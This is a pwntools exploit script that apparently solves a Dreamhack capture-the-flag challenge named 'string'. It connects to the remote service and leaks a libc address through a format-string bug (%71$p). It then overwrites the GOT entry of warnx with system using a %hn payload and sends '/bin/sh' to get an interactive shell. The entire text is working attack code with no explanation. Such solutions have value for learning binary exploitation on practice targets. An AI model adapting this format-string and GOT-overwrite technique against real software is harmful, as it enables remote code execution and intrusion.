#!/usr/bin/env python3

from pwn import *
import re

e = ELF("./string")
libc = ELF("./libc.so.6")

HOST = "host1.dreamhack.games"
PORT = 12604

#conn = process([e.path, e.path], env={"LD_PRELOAD":"./libc.so.6"})
conn = remote(HOST, PORT)

fms = lambda value,offset: b"%"+bytes(str(value), encoding="utf8")+b"c"+b"%"+bytes(str(offset), encoding="utf8")+b"$hn"

libc_offset = 0x18637
system_offset = 0x0003A940
conn.sendlineafter("> ", "1\n%71$p")
conn.sendlineafter("> ", "2")

conn.recv() # only use on remote
libc_start_main = int(re.search(b"0[xX][0-9a-fA-F]+", conn.recv(timeout=0.5)).group(), 16)
#libc_start_main = int([conn.recv() for v0 in range(2)][1][:10], 16)

libc_addr = libc_start_main - libc_offset
system = libc_addr + system_offset

payload = b""
payload += p32(e.got["warnx"]+2)
payload += p32(e.got["warnx"]+0)
payload += fms(int((hex(system)[2:])[:4], 16)-8, 5)
payload += fms(int((hex(system)[2:])[:4], 16)-int((hex(system)[2:])[4:],16), 6)

conn.sendline("1")
conn.sendlineafter("Input: ", payload)
conn.sendline("2")
sleep(0.5)
conn.sendline("1")
conn.sendlineafter("Input: ", b"/bin/sh"+b"\x00"*20)
conn.sendline("2")
conn.interactive()
